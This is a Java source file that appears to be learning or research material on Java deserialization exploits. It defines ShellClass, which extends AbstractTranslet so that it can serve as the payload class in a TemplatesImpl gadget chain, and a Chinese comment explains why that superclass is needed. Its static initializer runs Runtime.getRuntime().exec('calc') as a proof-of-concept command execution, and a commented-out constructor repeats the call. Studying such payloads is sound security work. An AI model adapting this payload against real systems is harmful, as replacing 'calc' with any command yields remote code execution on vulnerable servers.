package Seri;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;

/**
 * 为什么一定要继承 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 * TemplatesImpl#defineTransletClasses()方法中存在代码
 * ```
 * final Class superClass = _class[i].getSuperclass();
 *
 * // Check if this is the main class
 * if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
 *     _transletIndex = i;
 * }
 * ```
 * 会判断读取的类的父类是否为 AbstractTranslet
 */
public class ShellClass extends AbstractTranslet{
    static {
        try{
            Runtime.getRuntime().exec("calc");
        } catch (Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
//    public ShellClass() throws Exception {
//        super();
//        System.out.println("Hello TemplatesImpl");
//        Runtime.getRuntime().exec("calc");
//    }
}
